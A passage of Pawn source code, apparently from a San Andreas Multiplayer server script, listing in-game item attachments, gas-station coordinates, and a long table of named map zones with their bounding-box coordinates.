 	{OBJ_DESTORNILLADOR, {0.1010, 0.0309, 0.0129}, {0.0000, 0.0000, 0.0000},	   {1.0000, 1.0000, 1.0000}, !"Destornillador"},
	{OBJ_DINAMITA, 	     {0.09, -0.0429, -0.0260}, {-27.8000, -8.4999, -30.2999},  {1.0000, 1.0000, 1.0000}, !"Dinamita"},
	{OBJ_MASCARA,        {0.2070, 0.0360, 0.0160}, {-107.8999, 0.0000, -12.6000},  {1.0000, 1.0000, 1.0000}, !"Máscara"}
};

static const Float: EstacionServicio [][] =
{
	{1595.5406, 2198.0520, 10.3863},
	{2202.0649, 2472.6697, 10.5677},
	{2115.1929, 919.9908, 10.5266},
	{2640.7209, 1105.9565, 10.5274},
	{608.5971, 1699.6238, 6.9922},
	{618.4878, 1684.5792, 6.9922},
	{2146.3467, 2748.2893, 10.5245},
	{-1679.4595, 412.5129, 6.9973},
	{-1327.5607, 2677.4316, 49.8093},
	{-1470.0050, 1863.2375, 32.3521},
	{-2409.2200, 976.2798, 45.2969},
	{-2244.1396, -2560.5833, 31.9219},
	{-1606.0544, -2714.3083, 48.5335},
	{1937.4293, -1773.1865, 13.3828},
	{-91.3854, -1169.9175, 2.4213},
	{1383.4221, 462.5385, 20.1506},
	{660.4590, -565.0394, 16.3359},
	{1381.7206, 459.1907, 20.3452},
	{-1605.7156, -2714.4573, 48.5335},
	{1008.1107, -937.3372, 42.6493},
	{-2029.4047,157.2388,28.5722},
	{2651.4397,-2116.0381,13.5469}
};

static const ZoneNames [][E_ZONE_TYPE] =
{
	{!"The Big Ear", 				{-410.00, 1403.30, -3.00, -137.90, 1681.20, 200.00}},
	{!"Aldea Malvada",				{-1372.10, 2498.50, 0.00, -1277.50, 2615.30, 200.00}},
	{!"Angel Pine",				 	{-2324.90, -2584.20, -6.10, -1964.20, -2212.10, 200.00}},
	{!"Arco del Oeste",			 	{-901.10, 2221.80, 0.00, -592.00, 2571.90, 200.00}},
	{!"Avispa Country Club",		{-2646.40, -355.40, 0.00, -2270.00, -222.50, 200.00}},
	{!"Avispa Country Club",		{-2831.80, -430.20, -6.10, -2646.40, -222.50, 200.00}},
	{!"Avispa Country Club",		{-2361.50, -417.10, 0.00, -2270.00, -355.40, 200.00}},
	{!"Avispa Country Club",		{-2667.80, -302.10, -28.80, -2646.40, -262.30, 71.10}},
	{!"Avispa Country Club",		{-2470.00, -355.40, 0.00, -2270.00, -318.40, 46.10}},
	{!"Avispa Country Club",		{-2550.00, -355.40, 0.00, -2470.00, -318.40, 39.70}},
	{!"Back o Beyond",				{-1166.90, -2641.10, 0.00, -321.70, -1856.00, 200.00}},
	{!"Battery Point",				{-2741.00, 1268.40, -4.50, -2533.00, 1490.40, 200.00}},
	{!"Bayside",					{-2741.00, 2175.10, 0.00, -2353.10, 2722.70, 200.00}},
	{!"Bayside Marina",				{-2353.10, 2275.70, 0.00, -2153.10, 2475.70, 200.00}},
	{!"Beacon Hill",				{-399.60, -1075.50, -1.40, -319.00, -977.50, 198.50}},
	{!"Blackfield",					{964.30, 1203.20, -89.00, 1197.30, 1403.20, 110.90}},
	{!"Blackfield",					{964.30, 1403.20, -89.00, 1197.30, 1726.20, 110.90}},
	{!"Blackfield Chapel",			{1375.60, 596.30, -89.00, 1558.00, 823.20, 110.90}},
	{!"Blackfield Chapel",			{1325.60, 596.30, -89.00, 1375.60, 795.00, 110.90}},
	{!"Blackfield Intersection",	{1197.30, 1044.60, -89.00, 1277.00, 1163.30, 110.90}},
	{!"Blackfield Intersection",	{1166.50, 795.00, -89.00, 1375.60, 1044.60, 110.90}},
	{!"Blackfield Intersection",	{1277.00, 1044.60, -89.00, 1315.30, 1087.60, 110.90}},
	{!"Blackfield Intersection",	{1375.60, 823.20, -89.00, 1457.30, 919.40, 110.90}},
	{!"Blueberry",					{104.50, -220.10, 2.30, 349.60, 152.20, 200.00}},
	{!"Blueberry",					{19.60, -404.10, 3.80, 349.60, -220.10, 200.00}},
	{!"Blueberry Acres",			{-319.60, -220.10, 0.00, 104.50, 293.30, 200.00}},
	{!"Caligula's Palace",			{2087.30, 1543.20, -89.00, 2437.30, 1703.20, 110.90}},
	{!"Caligula's Palace",			{2137.40, 1703.20, -89.00, 2437.30, 1783.20, 110.90}},
	{!"Calton Heights",				{-2274.10, 744.10, -6.10, -1982.30, 1358.90, 200.00}},
	{!"Chinatown",					{-2274.10, 578.30, -7.60, -2078.60, 744.10, 200.00}},
	{!"City Hall",					{-2867.80, 277.40, -9.10, -2593.40, 458.40, 200.00}},
	{!"Come-A-Lot",					{2087.30, 943.20, -89.00, 2623.10, 1203.20, 110.90}},
	{!"Commerce",					{1323.90, -1842.20, -89.00, 1701.90, -1722.20, 110.90}},
	{!"Commerce",					{1323.90, -1722.20, -89.00, 1440.90, -1577.50, 110.90}},
	{!"Commerce",					{1370.80, -1577.50, -89.00, 1463.90, -1384.90, 110.90}},
	{!"Commerce",					{1463.90, -1577.50, -89.00, 1667.90, -1430.80, 110.90}},
	{!"Commerce",					{1583.50, -1722.20, -89.00, 1758.90, -1577.50, 110.90}},
	{!"Commerce",					{1667.90, -1577.50, -89.00, 1812.60, -1430.80, 110.90}},
	{!"Conference Center",			{1046.10, -1804.20, -89.00, 1323.90, -1722.20, 110.90}},
	{!"Conference Center",			{1073.20, -1842.20, -89.00, 1323.90, -1804.20, 110.90}},
	{!"Cranberry Station",			{-2007.80, 56.30, 0.00, -1922.00, 224.70, 100.00}},
	{!"Creek",						{2749.90, 1937.20, -89.00, 2921.60, 2669.70, 110.90}},
	{!"Dillimore",					{580.70, -674.80, -9.50, 861.00, -404.70, 200.00}},
	{!"Doherty",					{-2270.00, -324.10, -0.00, -1794.90, -222.50, 200.00}},
	{!"Doherty",					{-2173.00, -222.50, -0.00, -1794.90, 265.20, 200.00}},
	{!"Downtown",					{-1982.30, 744.10, -6.10, -1871.70, 1274.20, 200.00}},
	{!"Downtown",					{-1871.70, 1176.40, -4.50, -1620.30, 1274.20, 200.00}},
	{!"Downtown",					{-1700.00, 744.20, -6.10, -1580.00, 1176.50, 200.00}},
	{!"Downtown",					{-1580.00, 744.20, -6.10, -1499.80, 1025.90, 200.00}},
	{!"Downtown",					{-2078.60, 578.30, -7.60, -1499.80, 744.20, 200.00}},
	{!"Downtown",					{-1993.20, 265.20, -9.10, -1794.90, 578.30, 200.00}},
	{!"Downtown Los Santos",		{1463.90, -1430.80, -89.00, 1724.70, -1290.80, 110.90}},
	{!"Downtown Los Santos",		{1724.70, -1430.80, -89.00, 1812.60, -1250.90, 110.90}},
	{!"Downtown Los Santos",		{1463.90, -1290.80, -89.00, 1724.70, -1150.80, 110.90}},
	{!"Downtown Los Santos",		{1370.80, -1384.90, -89.00, 1463.90, -1170.80, 110.90}},
	{!"Downtown Los Santos",		{1724.70, -1250.90, -89.00, 1812.60, -1150.80, 110.90}},
	{!"Downtown Los Santos",		{1370.80, -1170.80, -89.00, 1463.90, -1130.80, 110.90}},
	{!"Downtown Los Santos",		{1378.30, -1130.80, -89.00, 1463.90, -1026.30, 110.90}},
	{!"Downtown Los Santos",		{1391.00, -1026.30, -89.00, 1463.90, -926.90, 110.90}},
	{!"Downtown Los Santos",		{1507.50, -1385.20, 110.90, 1582.50, -1325.30, 335.90}},
	{!"East Beach",					{2632.80, -1852.80, -89.00, 2959.30, -1668.10, 110.90}},
	{!"East Beach",					{2632.80, -1668.10, -89.00, 2747.70, -1393.40, 110.90}},
	{!"East Beach",					{2747.70, -1668.10, -89.00, 2959.30, -1498.60, 110.90}},
	{!"East Beach",					{2747.70, -1498.60, -89.00, 2959.30, -1120.00, 110.90}},
	{!"East Los Santos",			{2421.00, -1628.50, -89.00, 2632.80, -1454.30, 110.90}},
	{!"East Los Santos",			{2222.50, -1628.50, -89.00, 2421.00, -1494.00, 110.90}},
	{!"East Los Santos",			{2266.20, -1494.00, -89.00, 2381.60, -1372.00, 110.90}},
	{!"East Los Santos",			{2381.60, -1494.00, -89.00, 2421.00, -1454.30, 110.90}},
	{!"East Los Santos",			{2281.40, -1372.00, -89.00, 2381.60, -1135.00, 110.90}},
	{!"East Los Santos",			{2381.60, -1454.30, -89.00, 2462.10, -1135.00, 110.90}},
	{!"East Los Santos",			{2462.10, -1454.30, -89.00, 2581.70, -1135.00, 110.90}},
	{!"Easter Basin",				{-1794.90, 249.90, -9.10, -1242.90, 578.30, 200.00}},
	{!"Easter Basin",				{-1794.90, -50.00, -0.00, -1499.80, 249.90, 200.00}},
	{!"Easter Bay Airport",			{-1499.80, -50.00, -0.00, -1242.90, 249.90, 200.00}},
	{!"Easter Bay Airport",			{-1794.90, -730.10, -3.00, -1213.90, -50.00, 200.00}},
	{!"Easter Bay Airport",			{-1213.90, -730.10, 0.00, -1132.80, -50.00, 200.00}},
	{!"Easter Bay Airport",			{-1242.90, -50.00, 0.00, -1213.90, 578.30, 200.00}},
	{!"Easter Bay Airport",			{-1213.90, -50.00, -4.50, -947.90, 578.30, 200.00}},
	{!"Easter Bay Airport",			{-1315.40, -405.30, 15.40, -1264.40, -209.50, 25.40}},
	{!"Easter Bay Airport",			{-1354.30, -287.30, 15.40, -1315.40, -209.50, 25.40}},
	{!"Easter Bay Airport",			{-1490.30, -209.50, 15.40, -1264.40, -148.30, 25.40}},
	{!"Easter Bay Chemicals",		{-1132.80, -768.00, 0.00, -956.40, -578.10, 200.00}},
	{!"Easter Bay Chemicals",		{-1132.80, -787.30, 0.00, -956.40, -768.00, 200.00}},
	{!"El Castillo del Diablo",		{-464.50, 2217.60, 0.00, -208.50, 2580.30, 200.00}},
	{!"El Castillo del Diablo",		{-208.50, 2123.00, -7.60, 114.00, 2337.10, 200.00}},
	{!"El Castillo del Diablo",		{-208.50, 2337.10, 0.00, 8.40, 2487.10, 200.00}},
	{!"El Corona",					{1812.60, -2179.20, -89.00, 1970.60, -1852.80, 110.90}},
	{!"El Corona",					{1692.60, -2179.20, -89.00, 1812.60, -1842.20, 110.90}},
	{!"El Quebrados",				{-1645.20, 2498.50, 0.00, -1372.10, 2777.80, 200.00}},
	{!"Esplanade East",				{-1620.30, 1176.50, -4.50, -1580.00, 1274.20, 200.00}},
	{!"Esplanade East",				{-1580.00, 1025.90, -6.10, -1499.80, 1274.20, 200.00}},
	{!"Esplanade East",				{-1499.80, 578.30, -79.60, -1339.80, 1274.20, 20.30}},
	{!"Esplanade North",			{-2533.00, 1358.90, -4.50, -1996.60, 1501.20, 200.00}},
	{!"Esplanade North",			{-1996.60, 1358.90, -4.50, -1524.20, 1592.50, 200.00}},
	{!"Esplanade North",			{-1982.30, 1274.20, -4.50, -1524.20, 1358.90, 200.00}},
	{!"Fallen Tree",				{-792.20, -698.50, -5.30, -452.40, -380.00, 200.00}},
	{!"Fallow Bridge",				{434.30, 366.50, 0.00, 603.00, 555.60, 200.00}},
	{!"Fern Ridge",					{508.10, -139.20, 0.00, 1306.60, 119.50, 200.00}},
	{!"Financial",					{-1871.70, 744.10, -6.10, -1701.30, 1176.40, 300.00}},
	{!"Fisher's Lagoon",			{1916.90, -233.30, -100.00, 2131.70, 13.80, 200.00}},
	{!"Flint Intersection",			{-187.70, -1596.70, -89.00, 17.00, -1276.60, 110.90}},
	{!"Flint Range",				{-594.10, -1648.50, 0.00, -187.70, -1276.60, 200.00}},
	{!"Fort Carson",				{-376.20, 826.30, -3.00, 123.70, 1220.40, 200.00}},
	{!"Foster Valley",				{-2270.00, -430.20, -0.00, -2178.60, -324.10, 200.00}},
	{!"Foster Valley",				{-2178.60, -599.80, -0.00, -1794.90, -324.10, 200.00}},
	{!"Foster Valley",				{-2178.60, -1115.50, 0.00, -1794.90, -599.80, 200.00}},
	{!"Foster Valley",				{-2178.60, -1250.90, 0.00, -1794.90, -1115.50, 200.00}},
	{!"Frederick Bridge",			{2759.20, 296.50, 0.00, 2774.20, 594.70, 200.00}},
	{!"Gant Bridge",				{-2741.40, 1659.60, -6.10, -2616.40, 2175.10, 200.00}},
	{!"Gant Bridge",				{-2741.00, 1490.40, -6.10, -2616.40, 1659.60, 200.00}},
	{!"Ganton",						{2222.50, -1852.80, -89.00, 2632.80, -1722.30, 110.90}},
	{!"Ganton",						{2222.50, -1722.30, -89.00, 2632.80, -1628.50, 110.90}},
	{!"Garcia",						{-2411.20, -222.50, -0.00, -2173.00, 265.20, 200.00}},
	{!"Garcia",						{-2395.10, -222.50, -5.30, -2354.00, -204.70, 200.00}},
	{!"Garver Bridge",				{-1339.80, 828.10, -89.00, -1213.90, 1057.00, 110.90}},
	{!"Garver Bridge",				{-1213.90, 950.00, -89.00, -1087.90, 1178.90, 110.90}},
	{!"Garver Bridge",				{-1499.80, 696.40, -179.60, -1339.80, 925.30, 20.30}},
	{!"Glen Park",					{1812.60, -1449.60, -89.00, 1996.90, -1350.70, 110.90}},
	{!"Glen Park",					{1812.60, -1100.80, -89.00, 1994.30, -973.30, 110.90}},
	{!"Glen Park",					{1812.60, -1350.70, -89.00, 2056.80, -1100.80, 110.90}},
	{!"Green Palms",				{176.50, 1305.40, -3.00, 338.60, 1520.70, 200.00}},
	{!"Greenglass College",			{964.30, 1044.60, -89.00, 1197.30, 1203.20, 110.90}},
	{!"Greenglass College",			{964.30, 930.80, -89.00, 1166.50, 1044.60, 110.90}},
	{!"Hampton Barns",				{603.00, 264.30, 0.00, 761.90, 366.50, 200.00}},
	{!"Hankypanky Point",			{2576.90, 62.10, 0.00, 2759.20, 385.50, 200.00}},
	{!"Harry Gold Parkway",			{1777.30, 863.20, -89.00, 1817.30, 2342.80, 110.90}},
	{!"Hashbury",					{-2593.40, -222.50, -0.00, -2411.20, 54.70, 200.00}},
	{!"Hilltop Farm",				{967.30, -450.30, -3.00, 1176.70, -217.90, 200.00}},
	{!"Hunter Quarry",				{337.20, 710.80, -115.20, 860.50, 1031.70, 203.70}},
	{!"Idlewood",					{1812.60, -1852.80, -89.00, 1971.60, -1742.30, 110.90}},
	{!"Idlewood",					{1812.60, -1742.30, -89.00, 1951.60, -1602.30, 110.90}},
	{!"Idlewood",					{1951.60, -1742.30, -89.00, 2124.60, -1602.30, 110.90}},
	{!"Idlewood",					{1812.60, -1602.30, -89.00, 2124.60, -1449.60, 110.90}},
	{!"Idlewood",					{2124.60, -1742.30, -89.00, 2222.50, -1494.00, 110.90}},
	{!"Idlewood",					{1971.60, -1852.80, -89.00, 2222.50, -1742.30, 110.90}},
	{!"Jefferson",					{1996.90, -1449.60, -89.00, 2056.80, -1350.70, 110.90}},
	{!"Jefferson",					{2124.60, -1494.00, -89.00, 2266.20, -1449.60, 110.90}},
	{!"Jefferson",					{2056.80, -1372.00, -89.00, 2281.40, -1210.70, 110.90}},
	{!"Jefferson",					{2056.80, -1210.70, -89.00, 2185.30, -1126.30, 110.90}},
	{!"Jefferson",					{2185.30, -1210.70, -89.00, 2281.40, -1154.50, 110.90}},
	{!"Jefferson",					{2056.80, -1449.60, -89.00, 2266.20, -1372.00, 110.90}},
	{!"Julius Thruway East",		{2623.10, 943.20, -89.00, 2749.90, 1055.90, 110.90}},
	{!"Julius Thruway East",		{2685.10, 1055.90, -89.00, 2749.90, 2626.50, 110.90}},
	{!"Julius Thruway East",		{2536.40, 2442.50, -89.00, 2685.10, 2542.50, 110.90}},
	{!"Julius Thruway East",		{2625.10, 2202.70, -89.00, 2685.10, 2442.50, 110.90}},
	{!"Julius Thruway North",		{2498.20, 2542.50, -89.00, 2685.10, 2626.50, 110.90}},
	{!"Julius Thruway North",		{2237.40, 2542.50, -89.00, 2498.20, 2663.10, 110.90}},
	{!"Julius Thruway North",		{2121.40, 2508.20, -89.00, 2237.40, 2663.10, 110.90}},
	{!"Julius Thruway North",		{1938.80, 2508.20, -89.00, 2121.40, 2624.20, 110.90}},
	{!"Julius Thruway North",		{1534.50, 2433.20, -89.00, 1848.40, 2583.20, 110.90}},
	{!"Julius Thruway North",		{1848.40, 2478.40, -89.00, 1938.80, 2553.40, 110.90}},
	{!"Julius Thruway North",		{1704.50, 2342.80, -89.00, 1848.40, 2433.20, 110.90}},
	{!"Julius Thruway North",		{1377.30, 2433.20, -89.00, 1534.50, 2507.20, 110.90}},
	{!"Julius Thruway South",		{1457.30, 823.20, -89.00, 2377.30, 863.20, 110.90}},
	{!"Julius Thruway South",		{2377.30, 788.80, -89.00, 2537.30, 897.90, 110.90}},
	{!"Julius Thruway West",		{1197.30, 1163.30, -89.00, 1236.60, 2243.20, 110.90}},
	{!"Julius Thruway West",		{1236.60, 2142.80, -89.00, 1297.40, 2243.20, 110.90}},
	{!"Juniper Hill",				{-2533.00, 578.30, -7.60, -2274.10, 968.30, 200.00}},
	{!"Juniper Hollow",				{-2533.00, 968.30, -6.10, -2274.10, 1358.90, 200.00}},
	{!"K.A.C.C. Military Fuels",	{2498.20, 2626.50, -89.00, 2749.90, 2861.50, 110.90}},
	{!"Kincaid Bridge",				{-1339.80, 599.20, -89.00, -1213.90, 828.10, 110.90}},
	{!"Kincaid Bridge",				{-1213.90, 721.10, -89.00, -1087.90, 950.00, 110.90}},
	{!"Kincaid Bridge",				{-1087.90, 855.30, -89.00, -961.90, 986.20, 110.90}},
	{!"King's",						{-2329.30, 458.40, -7.60, -1993.20, 578.30, 200.00}},
	{!"King's",						{-2411.20, 265.20, -9.10, -1993.20, 373.50, 200.00}},
	{!"King's",						{-2253.50, 373.50, -9.10, -1993.20, 458.40, 200.00}},
	{!"LVA Freight Depot",			{1457.30, 863.20, -89.00, 1777.40, 1143.20, 110.90}},
	{!"LVA Freight Depot",			{1375.60, 919.40, -89.00, 1457.30, 1203.20, 110.90}},
	{!"LVA Freight Depot",			{1277.00, 1087.60, -89.00, 1375.60, 1203.20, 110.90}},
	{!"LVA Freight Depot",			{1315.30, 1044.60, -89.00, 1375.60, 1087.60, 110.90}},
	{!"LVA Freight Depot",			{1236.60, 1163.40, -89.00, 1277.00, 1203.20, 110.90}},
	{!"Las Barrancas",				{-926.10, 1398.70, -3.00, -719.20, 1634.60, 200.00}},
	{!"Las Brujas",					{-365.10, 2123.00, -3.00, -208.50, 2217.60, 200.00}},
	{!"Las Colinas",				{1994.30, -1100.80, -89.00, 2056.80, -920.80, 110.90}},
	{!"Las Colinas",				{2056.80, -1126.30, -89.00, 2126.80, -920.80, 110.90}},
	{!"Las Colinas",				{2185.30, -1154.50, -89.00, 2281.40, -934.40, 110.90}},
	{!"Las Colinas",				{2126.80, -1126.30, -89.00, 2185.30, -934.40, 110.90}},
	{!"Las Colinas",				{2747.70, -1120.00, -89.00, 2959.30, -945.00, 110.90}},
	{!"Las Colinas",				{2632.70, -1135.00, -89.00, 2747.70, -945.00, 110.90}},
	{!"Las Colinas",				{2281.40, -1135.00, -89.00, 2632.70, -945.00, 110.90}},
	{!"Las Payasadas",				{-354.30, 2580.30, 2.00, -133.60, 2816.80, 200.00}},
	{!"Las Venturas Airport",		{1236.60, 1203.20, -89.00, 1457.30, 1883.10, 110.90}},
	{!"Las Venturas Airport",		{1457.30, 1203.20, -89.00, 1777.30, 1883.10, 110.90}},
	{!"Las Venturas Airport",		{1457.30, 1143.20, -89.00, 1777.40, 1203.20, 110.90}},
	{!"Las Venturas Airport",		{1515.80, 1586.40, -12.50, 1729.90, 1714.50, 87.50}},
	{!"Last Dime Motel",			{1823.00, 596.30, -89.00, 1997.20, 823.20, 110.90}},
	{!"Leafy Hollow",				{-1166.90, -1856.00, 0.00, -815.60, -1602.00, 200.00}},
	{!"Liberty City",				{-1000.00, 400.00, 1300.00, -700.00, 600.00, 1400.00}},
	{!"Lil' Probe Inn",				{-90.20, 1286.80, -3.00, 153.80, 1554.10, 200.00}},
	{!"Linden Side",				{2749.90, 943.20, -89.00, 2923.30, 1198.90, 110.90}},
	{!"Linden Station",				{2749.90, 1198.90, -89.00, 2923.30, 1548.90, 110.90}},
	{!"Linden Station",				{2811.20, 1229.50, -39.50, 2861.20, 1407.50, 60.40}},
	{!"Little Mexico",				{1701.90, -1842.20, -89.00, 1812.60, -1722.20, 110.90}},
	{!"Little Mexico",				{1758.90, -1722.20, -89.00, 1812.60, -1577.50, 110.90}},
	{!"Los Flores",					{2581.70, -1454.30, -89.00, 2632.80, -1393.40, 110.90}},
	{!"Los Flores",					{2581.70, -1393.40, -89.00, 2747.70, -1135.00, 110.90}},
	{!"Los Santos International",	{1249.60, -2394.30, -89.00, 1852.00, -2179.20, 110.90}},
	{!"Los Santos International",	{1852.00, -2394.30, -89.00, 2089.00, -2179.20, 110.90}},
	{!"Los Santos International",	{1382.70, -2730.80, -89.00, 2201.80, -2394.30, 110.90}},
	{!"Los Santos International",	{1974.60, -2394.30, -39.00, 2089.00, -2256.50, 60.90}},
	{!"Los Santos International",	{1400.90, -2669.20, -39.00, 2189.80, -2597.20, 60.90}},
	{!"Los Santos International",	{2051.60, -2597.20, -39.00, 2152.40, -2394.30, 60.90}},
	{!"Marina",						{647.70, -1804.20, -89.00, 851.40, -1577.50, 110.90}},
	{!"Marina",						{647.70, -1577.50, -89.00, 807.90, -1416.20, 110.90}},
	{!"Marina",						{807.90, -1577.50, -89.00, 926.90, -1416.20, 110.90}},
	{!"Market",			 			{787.40, -1416.20, -89.00, 1072.60, -1310.20, 110.90}},
	{!"Market",						{952.60, -1310.20, -89.00, 1072.60, -1130.80, 110.90}},
	{!"Market",						{1072.60, -1416.20, -89.00, 1370.80, -1130.80, 110.90}},
	{!"Market",						{926.90, -1577.50, -89.00, 1370.80, -1416.20, 110.90}},
	{!"Market Station",				{787.40, -1410.90, -34.10, 866.00, -1310.20, 65.80}},
	{!"Martin Bridge",				{-222.10, 293.30, 0.00, -122.10, 476.40, 200.00}},
	{!"Missionary Hill",			{-2994.40, -811.20, 0.00, -2178.60, -430.20, 200.00}},
	{!"Montgomery",					{1119.50, 119.50, -3.00, 1451.40, 493.30, 200.00}},
	{!"Montgomery",					{1451.40, 347.40, -6.10, 1582.40, 420.80, 200.00}},
	{!"Montgomery Intersection",	{1546.60, 208.10, 0.00, 1745.80, 347.40, 200.00}},
	{!"Montgomery Intersection",	{1582.40, 347.40, 0.00, 1664.60, 401.70, 200.00}},
	{!"Mulholland",					{1414.00, -768.00, -89.00, 1667.60, -452.40, 110.90}},
	{!"Mulholland",					{1281.10, -452.40, -89.00, 1641.10, -290.90, 110.90}},
	{!"Mulholland",					{1269.10, -768.00, -89.00, 1414.00, -452.40, 110.90}},
	{!"Mulholland",					{1357.00, -926.90, -89.00, 1463.90, -768.00, 110.90}},
	{!"Mulholland",					{1318.10, -910.10, -89.00, 1357.00, -768.00, 110.90}},
	{!"Mulholland",					{1169.10, -910.10, -89.00, 1318.10, -768.00, 110.90}},
	{!"Mulholland",					{768.60, -954.60, -89.00, 952.60, -860.60, 110.90}},
	{!"Mulholland",					{687.80, -860.60, -89.00, 911.80, -768.00, 110.90}},
	{!"Mulholland",					{737.50, -768.00, -89.00, 1142.20, -674.80, 110.90}},
	{!"Mulholland",					{1096.40, -910.10, -89.00, 1169.10, -768.00, 110.90}},
	{!"Mulholland",					{952.60, -937.10, -89.00, 1096.40, -860.60, 110.90}},
	{!"Mulholland",					{911.80, -860.60, -89.00, 1096.40, -768.00, 110.90}},
	{!"Mulholland",					{861.00, -674.80, -89.00, 1156.50, -600.80, 110.90}},
	{!"Mulholland Intersection",	{1463.90, -1150.80, -89.00, 1812.60, -768.00, 110.90}},
	{!"North Rock",					{2285.30, -768.00, 0.00, 2770.50, -269.70, 200.00}},
	{!"Ocean Docks",				{2373.70, -2697.00, -89.00, 2809.20, -2330.40, 110.90}},
	{!"Ocean Docks",				{2201.80, -2418.30, -89.00, 2324.00, -2095.00, 110.90}},
	{!"Ocean Docks",				{2324.00, -2302.30, -89.00, 2703.50, -2145.10, 110.90}},
	{!"Ocean Docks",				{2089.00, -2394.30, -89.00, 2201.80, -2235.80, 110.90}},
	{!"Ocean Docks",				{2201.80, -2730.80, -89.00, 2324.00, -2418.30, 110.90}},
	{!"Ocean Docks",				{2703.50, -2302.30, -89.00, 2959.30, -2126.90, 110.90}},
	{!"Ocean Docks",				{2324.00, -2145.10, -89.00, 2703.50, -2059.20, 110.90}},
	{!"Ocean Flats",				{-2994.40, 277.40, -9.10, -2867.80, 458.40, 200.00}},
	{!"Ocean Flats",				{-2994.40, -222.50, -0.00, -2593.40, 277.40, 200.00}},
	{!"Ocean Flats",				{-2994.40, -430.20, -0.00, -2831.80, -222.50, 200.00}},
	{!"Octane Springs",				{338.60, 1228.50, 0.00, 664.30, 1655.00, 200.00}},
	{!"Old Venturas Strip",			{2162.30, 2012.10, -89.00, 2685.10, 2202.70, 110.90}},
	{!"Palisades",					{-2994.40, 458.40, -6.10, -2741.00, 1339.60, 200.00}},
	{!"Palomino Creek",				{2160.20, -149.00, 0.00, 2576.90, 228.30, 200.00}},
	{!"Paradiso",					{-2741.00, 793.40, -6.10, -2533.00, 1268.40, 200.00}},
	{!"Pershing Square",			{1440.90, -1722.20, -89.00, 1583.50, -1577.50, 110.90}},
	{!"Pilgrim",					{2437.30, 1383.20, -89.00, 2624.40, 1783.20, 110.90}},
	{!"Pilgrim",					{2624.40, 1383.20, -89.00, 2685.10, 1783.20, 110.90}},
	{!"Pilson Intersection",		{1098.30, 2243.20, -89.00, 1377.30, 2507.20, 110.90}},
	{!"Pirates in Men's Pants",		{1817.30, 1469.20, -89.00, 2027.40, 1703.20, 110.90}},
	{!"Playa del Seville",			{2703.50, -2126.90, -89.00, 2959.30, -1852.80, 110.90}},
	{!"Prickle Pine",				{1534.50, 2583.20, -89.00, 1848.40, 2863.20, 110.90}},
	{!"Prickle Pine",		 		{1117.40, 2507.20, -89.00, 1534.50, 2723.20, 110.90}},
	{!"Prickle Pine",		 		{1848.40, 2553.40, -89.00, 1938.80, 2863.20, 110.90}},
	{!"Prickle Pine",				{1938.80, 2624.20, -89.00, 2121.40, 2861.50, 110.90}},
	{!"Queens",						{-2533.00, 458.40, 0.00, -2329.30, 578.30, 200.00}},
	{!"Queens",						{-2593.40, 54.70, 0.00, -2411.20, 458.40, 200.00}},
	{!"Queens",						{-2411.20, 373.50, 0.00, -2253.50, 458.40, 200.00}},
	{!"Randolph Industrial Estate", {1558.00, 596.30, -89.00, 1823.00, 823.20, 110.90}},
	{!"Redsands East",				{1817.30, 2011.80, -89.00, 2106.70, 2202.70, 110.90}},
	{!"Redsands East",				{1817.30, 2202.70, -89.00, 2011.90, 2342.80, 110.90}},
	{!"Redsands East",				{1848.40, 2342.80, -89.00, 2011.90, 2478.40, 110.90}},
	{!"Redsands West",				{1236.60, 1883.10, -89.00, 1777.30, 2142.80, 110.90}},
	{!"Redsands West",				{1297.40, 2142.80, -89.00, 1777.30, 2243.20, 110.90}},
	{!"Redsands West",				{1377.30, 2243.20, -89.00, 1704.50, 2433.20, 110.90}},
	{!"Redsands West",				{1704.50, 2243.20, -89.00, 1777.30, 2342.80, 110.90}},
	{!"Regular Tom",				{-405.70, 1712.80, -3.00, -276.70, 1892.70, 200.00}},
	{!"Richman",					{647.50, -1118.20, -89.00, 787.40, -954.60, 110.90}},
	{!"Richman",					{647.50, -954.60, -89.00, 768.60, -860.60, 110.90}},
	{!"Richman",					{225.10, -1369.60, -89.00, 334.50, -1292.00, 110.90}},
	{!"Richman",					{225.10, -1292.00, -89.00, 466.20, -1235.00, 110.90}},
	{!"Richman",					{72.60, -1404.90, -89.00, 225.10, -1235.00, 110.90}},
	{!"Richman",					{72.60, -1235.00, -89.00, 321.30, -1008.10, 110.90}},
	{!"Richman",					{321.30, -1235.00, -89.00, 647.50, -1044.00, 110.90}},
	{!"Richman",					{321.30, -1044.00, -89.00, 647.50, -860.60, 110.90}},
	{!"Richman",					{321.30, -860.60, -89.00, 687.80, -768.00, 110.90}},
	{!"Richman",					{321.30, -768.00, -89.00, 700.70, -674.80, 110.90}},
	{!"Robada Intersection",		{-1119.00, 1178.90, -89.00, -862.00, 1351.40, 110.90}},
	{!"Roca Escalante",				{2237.40, 2202.70, -89.00, 2536.40, 2542.50, 110.90}},
	{!"Roca Escalante",				{2536.40, 2202.70, -89.00, 2625.10, 2442.50, 110.90}},
	{!"Rockshore East",				{2537.30, 676.50, -89.00, 2902.30, 943.20, 110.90}},
	{!"Rockshore West",				{1997.20, 596.30, -89.00, 2377.30, 823.20, 110.90}},
	{!"Rockshore West",				{2377.30, 596.30, -89.00, 2537.30, 788.80, 110.90}},
	{!"Rodeo",						{72.60, -1684.60, -89.00, 225.10, -1544.10, 110.90}},
	{!"Rodeo",						{72.60, -1544.10, -89.00, 225.10, -1404.90, 110.90}},
	{!"Rodeo",						{225.10, -1684.60, -89.00, 312.80, -1501.90, 110.90}},
	{!"Rodeo",						{225.10, -1501.90, -89.00, 334.50, -1369.60, 110.90}},
	{!"Rodeo",						{334.50, -1501.90, -89.00, 422.60, -1406.00, 110.90}},
	{!"Rodeo",						{312.80, -1684.60, -89.00, 422.60, -1501.90, 110.90}},
	{!"Rodeo",						{422.60, -1684.60, -89.00, 558.00, -1570.20, 110.90}},
	{!"Rodeo",						{558.00, -1684.60, -89.00, 647.50, -1384.90, 110.90}},
	{!"Rodeo",						{466.20, -1570.20, -89.00, 558.00, -1385.00, 110.90}},
	{!"Rodeo",						{422.60, -1570.20, -89.00, 466.20, -1406.00, 110.90}},
	{!"Rodeo",						{466.20, -1385.00, -89.00, 647.50, -1235.00, 110.90}},
	{!"Rodeo",						{334.50, -1406.00, -89.00, 466.20, -1292.00, 110.90}},
	{!"Royal Casino",				{2087.30, 1383.20, -89.00, 2437.30, 1543.20, 110.90}},
	{!"San Andreas Sound",			{2450.30, 385.50, -100.00, 2759.20, 562.30, 200.00}},
	{!"Santa Flora",				{-2741.00, 458.40, -7.60, -2533.00, 793.40, 200.00}},
